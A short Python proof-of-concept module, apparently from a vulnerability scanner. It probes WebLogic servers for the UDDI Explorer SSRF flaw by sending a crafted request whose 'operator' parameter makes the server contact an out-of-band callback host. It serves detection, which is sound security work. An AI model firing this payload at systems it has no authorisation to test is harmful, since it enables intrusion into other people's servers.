import requests
import lib.config.config as config
from lib.core.monitor import port_monitor,page_monitor

def poc(url):
    poc_type = 'weblogic:ssrf'

    ports = ['80','7001']

    port_info = {}

    port_info,ports = port_monitor(url, poc_type, ports)
    page_info,ports = page_monitor(url, '/uddiexplorer/SearchPublicRegistries.jsp', poc_type, ports)
    port_info.update(page_info)

    for port in ports:
        try:
            get_url = 'http://'+url+':'+port+'/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://%s.%s'%(url,config.ceye_path)
            s = requests.get(url=get_url , timeout=config.time_out) #proxies={'http':'http://127.0.0.1:8080'}
            if config.ceye_path in s.text:
                port_info[port] = [1,poc_type,'The page exist']
            else:
                port_info[port] = [0,poc_type,s.status_code]
            # return [1,'requests_len:'+len(s.text),s.status_code]
        except:
            port_info[port] = [0,poc_type,'Conect failed']
            # return [0,'conect_failed']
    return port_info
            
